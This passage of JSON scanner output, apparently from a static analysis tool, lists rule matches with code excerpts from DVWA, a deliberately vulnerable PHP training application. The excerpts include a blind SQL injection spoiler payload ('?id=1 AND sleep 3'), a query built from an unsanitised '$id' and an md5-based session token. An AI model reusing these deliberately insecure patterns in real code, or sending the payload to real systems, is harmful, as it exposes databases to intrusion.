        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT name, comment FROM guestbook&quot;;",
        "excerpt": "\n// XSS Stored guestbook function --\nfunction dvwaGuestbook() {\n\t$query  = &quot;SELECT name, comment FROM guestbook&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query );\n\n\t$guestbook = &#39;&#39;;\n\n\twhile( $row = mysqli_fetch_row( $result ) ) {\n",
        "startLocationLine": 504,
        "startLocationColumn": 12,
        "endLocationLine": 504,
        "endLocationColumn": 51
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\n// Database Management --\n\nif( $DBMS == &#39;MySQL&#39; ) {\n\t$DBMS = htmlspecialchars(strip_tags( $DBMS ));\n\t$DBMS_errorFunc = &#39;mysqli_error()&#39;;\n}\nelseif( $DBMS == &#39;PGSQL&#39; ) {\n\t$DBMS = htmlspecialchars(strip_tags( $DBMS ));\n",
        "startLocationLine": 443,
        "startLocationColumn": 15,
        "endLocationLine": 443,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\t//global $DBMS_connError;\n\tglobal $db;\n\n\tif( $DBMS == &#39;MySQL&#39; ) {\n\t\tif( !@($GLOBALS[&quot;___mysqli_ston&quot;] = mysqli_connect( $_DVWA[ &#39;db_server&#39; ],  $_DVWA[ &#39;db_user&#39; ],  $_DVWA[ &#39;db_password&#39; ] ))\n\t\t|| !@((bool)mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], &quot;USE &quot; . $_DVWA[ &#39;db_database&#39; ])) ) {\n\t\t\t//die( $DBMS_connError );\n\t\t\tdvwaLogout();\n\t\t\tdvwaMessagePush( &#39;Unable to connect to the database.&lt;br /&gt;&#39; . $DBMS_errorFunc );\n",
        "startLocationLine": 469,
        "startLocationColumn": 16,
        "endLocationLine": 469,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\t\t\tdvwaMessagePush( &#39;Unable to connect to the database.&lt;br /&gt;&#39; . $DBMS_errorFunc );\n\t\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;setup.php&#39; );\n\t\t}\n\t\t// MySQL PDO Prepared Statements (for impossible levels)\n\t\t$db = new PDO(&#39;mysql:host=&#39; . $_DVWA[ &#39;db_server&#39; ].&#39;;dbname=&#39; . $_DVWA[ &#39;db_database&#39; ].&#39;;charset=utf8&#39;, $_DVWA[ &#39;db_user&#39; ], $_DVWA[ &#39;db_password&#39; ]);\n\t\t$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\t\t$db-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\n\t}\n\telseif( $DBMS == &#39;PGSQL&#39; ) {\n",
        "startLocationLine": 477,
        "startLocationColumn": 6,
        "endLocationLine": 477,
        "endLocationColumn": 11
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\t\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;setup.php&#39; );\n\t\t}\n\t\t// MySQL PDO Prepared Statements (for impossible levels)\n\t\t$db = new PDO(&#39;mysql:host=&#39; . $_DVWA[ &#39;db_server&#39; ].&#39;;dbname=&#39; . $_DVWA[ &#39;db_database&#39; ].&#39;;charset=utf8&#39;, $_DVWA[ &#39;db_user&#39; ], $_DVWA[ &#39;db_password&#39; ]);\n\t\t$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\t\t$db-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\n\t}\n\telseif( $DBMS == &#39;PGSQL&#39; ) {\n\t\t//$dbconn = pg_connect(&quot;host={$_DVWA[ &#39;db_server&#39; ]} dbname={$_DVWA[ &#39;db_database&#39; ]} user={$_DVWA[ &#39;db_user&#39; ]} password={$_DVWA[ &#39;db_password&#39; ])}&quot;\n",
        "startLocationLine": 478,
        "startLocationColumn": 18,
        "endLocationLine": 478,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "$phpURLInclude    = &#39;PHP function allow_url_include: &lt;span class=&quot;&#39; . ( ini_get( &#39;allow_url_include&#39; ) ? &#39;success&quot;&gt;Enabled&#39; : &#39;failure&quot;&gt;Disabled&#39; ) . &#39;&lt;/span&gt;&#39;;                                   // RFI\n$phpURLFopen      = &#39;PHP function allow_url_fopen: &lt;span class=&quot;&#39; . ( ini_get( &#39;allow_url_fopen&#39; ) ? &#39;success&quot;&gt;Enabled&#39; : &#39;failure&quot;&gt;Disabled&#39; ) . &#39;&lt;/span&gt;&#39;;                                       // RFI\n$phpGD            = &#39;PHP module gd: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;gd&#39; ) &amp;&amp; function_exists( &#39;gd_info&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing - Only an issue if you want to play with captchas&#39; ) . &#39;&lt;/span&gt;&#39;;                    // File Upload\n$phpMySQL         = &#39;PHP module mysql: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;mysqli&#39; ) &amp;&amp; function_exists( &#39;mysqli_query&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // Core DVWA\n$phpPDO           = &#39;PHP module pdo_mysql: &lt;span class=&quot;&#39; . ( extension_loaded( &#39;pdo_mysql&#39; ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // SQLi\n$DVWARecaptcha    = &#39;reCAPTCHA key: &lt;span class=&quot;&#39; . ( ( isset( $_DVWA[ &#39;recaptcha_public_key&#39; ] ) &amp;&amp; $_DVWA[ &#39;recaptcha_public_key&#39; ] != &#39;&#39; ) ? &#39;success&quot;&gt;&#39; . $_DVWA[ &#39;recaptcha_public_key&#39; ] : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;\n\n$DVWAUploadsWrite = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPUploadPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPUploadPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                     // File Upload\n$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n",
        "startLocationLine": 563,
        "startLocationColumn": 33,
        "endLocationLine": 563,
        "endLocationColumn": 38
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "$DVWAOS           = &#39;Operating system: &lt;em&gt;&#39; . ( strtoupper( substr (PHP_OS, 0, 3)) === &#39;WIN&#39; ? &#39;Windows&#39; : &#39;*nix&#39; ) . &#39;&lt;/em&gt;&#39;;\n$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n",
        "startLocationLine": 574,
        "startLocationColumn": 22,
        "endLocationLine": 574,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n?&gt;\n",
        "startLocationLine": 575,
        "startLocationColumn": 22,
        "endLocationLine": 575,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n?&gt;\n\n",
        "startLocationLine": 576,
        "startLocationColumn": 22,
        "endLocationLine": 576,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n?&gt;\n\n",
        "startLocationLine": 577,
        "startLocationColumn": 22,
        "endLocationLine": 577,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( isset( $_SESSION[ &#39;session_token&#39; ] ) ) {\n\t\tdestroySessionToken();\n\t}\n\t$_SESSION[ &#39;session_token&#39; ] = md5( uniqid() );\n}\n\nfunction destroySessionToken() {  # Destroy any session with the name &#39;session_token&#39;\n\tunset( $_SESSION[ &#39;session_token&#39; ] );\n}\n",
        "startLocationLine": 538,
        "startLocationColumn": 33,
        "endLocationLine": 538,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "\nfunction messagesPopAllToHtml() {\n\t$messagesHtml = &#39;&#39;;\n\twhile( $message = dvwaMessagePop() ) {   // TODO- sharpen!\n\t\t$messagesHtml .= &quot;&lt;div class=\\&quot;message\\&quot;&gt;{$message}&lt;/div&gt;&quot;;\n\t}\n\n\treturn $messagesHtml;\n}\n",
        "startLocationLine": 174,
        "startLocationColumn": 46,
        "endLocationLine": 174,
        "endLocationColumn": 50
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "\n\t// Send Headers + main HTML code\n\tHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);   // HTTP/1.1\n\tHeader( &#39;Content-Type: text/html;charset=utf-8&#39; );     // TODO- proper XHTML headers...\n\tHeader( &#39;Expires: Tue, 23 Jun 2009 12:00:00 GMT&#39; );    // Date in the past\n\n\techo &quot;\n&lt;!DOCTYPE html PUBLIC \\&quot;-//W3C//DTD XHTML 1.0 Strict//EN\\&quot; \\&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\\&quot;&gt;\n\n",
        "startLocationLine": 277,
        "startLocationColumn": 60,
        "endLocationLine": 277,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "function dvwaHelpHtmlEcho( $pPage ) {\n\t// Send Headers\n\tHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);   // HTTP/1.1\n\tHeader( &#39;Content-Type: text/html;charset=utf-8&#39; );     // TODO- proper XHTML headers...\n\tHeader( &#39;Expires: Tue, 23 Jun 2009 12:00:00 GMT&#39; );    // Date in the past\n\n\techo &quot;\n&lt;!DOCTYPE html PUBLIC \\&quot;-//W3C//DTD XHTML 1.0 Strict//EN\\&quot; \\&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\\&quot;&gt;\n\n",
        "startLocationLine": 348,
        "startLocationColumn": 60,
        "endLocationLine": 348,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "function dvwaSourceHtmlEcho( $pPage ) {\n\t// Send Headers\n\tHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);   // HTTP/1.1\n\tHeader( &#39;Content-Type: text/html;charset=utf-8&#39; );     // TODO- proper XHTML headers...\n\tHeader( &#39;Expires: Tue, 23 Jun 2009 12:00:00 GMT&#39; );    // Date in the past\n\n\techo &quot;\n&lt;!DOCTYPE html PUBLIC \\&quot;-//W3C//DTD XHTML 1.0 Strict//EN\\&quot; \\&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\\&quot;&gt;\n\n",
        "startLocationLine": 385,
        "startLocationColumn": 60,
        "endLocationLine": 385,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;csrf&#39;, &#39;name&#39; =&gt; &#39;CSRF&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/csrf/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;fi&#39;, &#39;name&#39; =&gt; &#39;File Inclusion&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/fi/.?page=include.php&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;upload&#39;, &#39;name&#39; =&gt; &#39;File Upload&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/upload/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;captcha&#39;, &#39;name&#39; =&gt; &#39;Insecure CAPTCHA&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/captcha/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;sqli&#39;, &#39;name&#39; =&gt; &#39;SQL Injection&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/sqli/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;sqli_blind&#39;, &#39;name&#39; =&gt; &#39;SQL Injection (Blind)&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/sqli_blind/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;weak_id&#39;, &#39;name&#39; =&gt; &#39;Weak Session IDs&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/weak_id/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;xss_d&#39;, &#39;name&#39; =&gt; &#39;XSS (DOM)&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/xss_d/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;xss_r&#39;, &#39;name&#39; =&gt; &#39;XSS (Reflected)&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/xss_r/&#39; );\n",
        "startLocationLine": 204,
        "startLocationColumn": 77,
        "endLocationLine": 204,
        "endLocationColumn": 85
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\n\n// Setup Functions --\n$PHPUploadPath    = realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;hackable&quot; . DIRECTORY_SEPARATOR . &quot;uploads&quot; ) . DIRECTORY_SEPARATOR;\n$PHPIDSPath       = realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;external&quot; . DIRECTORY_SEPARATOR . &quot;phpids&quot; . DIRECTORY_SEPARATOR . dvwaPhpIdsVersionGet() . DIRECTORY_SEPARATOR . &quot;lib&quot; . DIRECTORY_SEPARATOR . &quot;IDS&quot; . DIRECTORY_SEPARATOR . &quot;tmp&quot; . DIRECTORY_SEPARATOR . &quot;phpids_log.txt&quot; );\n$PHPCONFIGPath       = realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;config&quot;);\n\n\n$phpDisplayErrors = &#39;PHP function display_errors: &lt;em&gt;&#39; . ( ini_get( &#39;display_errors&#39; ) ? &#39;Enabled&lt;/em&gt; &lt;i&gt;(Easy Mode!)&lt;/i&gt;&#39; : &#39;Disabled&lt;/em&gt;&#39; );                                                  // Verbose error messages (e.g. full path disclosure)\n",
        "startLocationLine": 552,
        "startLocationColumn": 89,
        "endLocationLine": 552,
        "endLocationColumn": 93
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/hackable/flags/fi.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "&lt;?php\n\nif( !defined( &#39;DVWA_WEB_PAGE_TO_ROOT&#39; ) ) {\n\texit (&quot;Nice try ;-). Use the file include next time!&quot;);\n}\n\n?&gt;\n\n1.) Bond. James Bond\n",
        "startLocationLine": 4,
        "startLocationColumn": 36,
        "endLocationLine": 4,
        "endLocationColumn": 57
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/hackable/flags/fi.php",
        "ruleId": "AI007800",
        "ruleName": "Cryptography: Encoding (Base-64)",
        "ruleDescription": "Cryptography: Encoding (Base-64)",
        "pattern": "base64",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Encoding.Base64"
        ],
        "sample": "base64",
        "excerpt": "echo $line3 . &quot;\\n\\n&lt;br /&gt;&lt;br /&gt;\\n&quot;;\n\n$line4 = &quot;NC4pI&quot; . &quot;FRoZSBwb29s&quot; . &quot;IG9uIH&quot; . &quot;RoZSByb29mIG1&quot; . &quot;1c3QgaGF&quot; . &quot;2ZSBh&quot; . &quot;IGxlY&quot; . &quot;Wsu&quot;;\necho base64_decode( $line4 );\n\n?&gt;\n\n&lt;!-- 5.) The world isn&#39;t run by weapons anymore, or energy, or money. It&#39;s run by little ones and zeroes, little bits of data. It&#39;s all just electrons. --&gt;\n\n",
        "startLocationLine": 20,
        "startLocationColumn": 6,
        "endLocationLine": 20,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/help/help.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The medium level uses a form of SQL injection protection, with the function of\n\t\t\t&quot;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://secure.php.net/manual/en/function.mysql-real-escape-string.php&#39;, &#39;mysql_real_escape_string()&#39; ); ?&gt;&quot;.\n\t\t\tHowever due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered.&lt;/p&gt;\n\n\t\t&lt;p&gt;The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?id=1 AND sleep 3&amp;Submit=Submit&lt;/span&gt;.&lt;/pre&gt;\n\n",
        "startLocationLine": 34,
        "startLocationColumn": 83,
        "endLocationLine": 34,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;",
